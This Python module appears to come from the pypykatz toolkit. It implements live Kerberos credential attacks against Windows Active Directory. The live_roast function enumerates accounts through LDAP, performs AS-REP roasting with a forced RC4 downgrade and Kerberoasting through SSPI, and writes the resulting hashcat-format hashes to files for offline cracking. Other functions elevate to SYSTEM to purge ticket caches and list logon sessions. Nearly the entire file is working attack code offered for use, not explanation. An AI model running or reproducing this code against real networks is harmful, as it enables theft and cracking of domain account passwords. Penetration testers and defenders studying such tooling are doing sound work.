
import datetime
from msldap.commons.url import MSLDAPURLDecoder
from winsspi.sspi import KerberoastSSPI
from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
from minikerberos.security import APREPRoast
from minikerberos.network.clientsocket import KerberosClientSocket
from minikerberos.common.target import KerberosTarget
from winsspi.sspi import KerberoastSSPI
from winacl.functions.highlevel import get_logon_info


from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.common.keytab import Keytab
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ
from minikerberos.common.utils import print_table
from minikerberos.common.ccache import CCACHE, Credential
from minikerberos.protocol.asn1_structs import KRBCRED



from pypykatz.commons.winapi.processmanipulator import ProcessManipulator
from pypykatz.kerberos.functiondefs.netsecapi import LsaConnectUntrusted, \
	LsaLookupAuthenticationPackage, KERB_PURGE_TKT_CACHE_REQUEST, LsaCallAuthenticationPackage, \
	LsaDeregisterLogonProcess, LsaRegisterLogonProcess, LsaEnumerateLogonSessions, \
	LsaGetLogonSessionData, LsaFreeReturnBuffer
	

def list_sessions():
	luids = LsaEnumerateLogonSessions()
	for luid in luids:
		try:
			session_info = LsaGetLogonSessionData(luid)
			print('USER "%s\\%s" SPN "%s" LUID %s' % (session_info.get('LogonDomain', '.'), session_info['UserName'], session_info['Upn'], hex(session_info['LogonId'])))

		except Exception as e:
			import traceback
			traceback.print_exc()
			print(e)
			continue

def purge(luid):
	if luid == 0:
		lsa_handle = LsaConnectUntrusted()
	else:
		pm = ProcessManipulator()
		pm.getsystem()
		lsa_handle = LsaRegisterLogonProcess('HELLOOO')
		pm.dropsystem()

	package_id = LsaLookupAuthenticationPackage(lsa_handle, 'kerberos')
	message = KERB_PURGE_TKT_CACHE_REQUEST()
	message_ret, status_ret, free_ptr = LsaCallAuthenticationPackage(lsa_handle, package_id, message)
	LsaFreeReturnBuffer(free_ptr)
	LsaDeregisterLogonProcess(lsa_handle)


async def live_roast(outfile = None):
	try:
		logon = get_logon_info()
		domain = logon['domain']
		url = 'ldap+sspi-ntlm://%s' % logon['logonserver']
		msldap_url = MSLDAPURLDecoder(url)
		client = msldap_url.get_client()
		_, err = await client.connect()
		if err is not None:
			raise err

		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
		spn_users = []
		asrep_users = []
		errors = []
		results = []
		final_results = []
		spn_cnt = 0
		asrep_cnt = 0
		async for user, err in client.get_all_knoreq_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			asrep_users.append(cred)
		async for user, err in client.get_all_service_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			spn_users.append(cred)
			
		for cred in asrep_users:
			results = []
			ks = KerberosTarget(domain)
			ar = APREPRoast(ks)
			res = await ar.run(cred, override_etype = [23])
			results.append(res)	
		
		if outfile is not None:
			filename = outfile + 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
					for thash in results:
						asrep_cnt += 1
						f.write(thash + '\r\n')
		else:
			final_results += results

		results = []
		for cred in spn_users:
			spn_name = '%s@%s' % (cred.username, cred.domain)
			if spn_name[:6] == 'krbtgt':
				continue
			ksspi = KerberoastSSPI()
			try:
				ticket = ksspi.get_ticket_for_spn(spn_name)
			except Exception as e:
				errors.append((spn_name, e))
				continue
			results.append(TGSTicket2hashcat(ticket))
		
		if outfile is not None:
			filename = outfile+ 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
				for thash in results:
					spn_cnt += 1
					f.write(thash + '\r\n')
		
		else:
			final_results += results

		return final_results, errors, None

	except Exception as e:
		return None, None, e

